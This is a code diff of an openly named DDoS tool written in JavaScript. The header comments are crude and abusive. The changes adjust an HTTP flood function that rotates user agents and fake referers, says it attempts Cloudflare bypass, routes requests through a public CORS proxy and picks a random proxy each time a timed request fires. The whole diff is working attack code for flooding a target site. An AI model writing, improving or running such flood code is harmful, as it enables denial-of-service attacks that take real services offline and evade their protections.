@@ -1,4 +1,4 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.0)
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.1)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
@@ -203,7 +203,7 @@ function updateProxies() {
 }
 
 // Enhanced httpFlood function with improved error handling and Cloudflare bypass attempts
-async function httpFlood(url, hexBytes) {
+async function httpFlood(url, hexBytes, proxy) {
     const randomString = Math.random().toString(36).substring(2, 15);
     const referer = `https://www.google.com/search?q=${randomString}`;
     const userAgents = [
@@ -215,7 +215,6 @@ async function httpFlood(url, hexBytes) {
         'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
     ];
     const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
     let proxyUrl = '';
 
     if (proxy) {
@@ -251,7 +250,9 @@ async function httpFlood(url, hexBytes) {
 
         // Use proxy if available
         if (proxy) {
-            fetchOptions.proxy = proxyUrl;
+            // Implement proxy functionality using a service like CORS Anywhere
+            const corsProxyUrl = 'https://cors-anywhere.herokuapp.com/'; // Replace with your CORS proxy
+            targetURL = corsProxyUrl + url;  // Append target URL to the CORS proxy
         }
 
         const response = await fetch(targetURL, fetchOptions);
@@ -297,7 +298,8 @@ function startDDoS(targetUrl, hexBytes, requestRate) {
     const intervalTime = 1000 / requestRate; // Interval between requests in milliseconds
 
     floodInterval = setInterval(() => {
-        httpFlood(targetUrl, hexBytes);
+        const proxy = proxies[Math.floor(Math.random() * proxies.length)];  // Select a random proxy
+        httpFlood(targetUrl, hexBytes, proxy);  // Pass the proxy to the httpFlood function
     }, intervalTime);
 
     updateTimer();
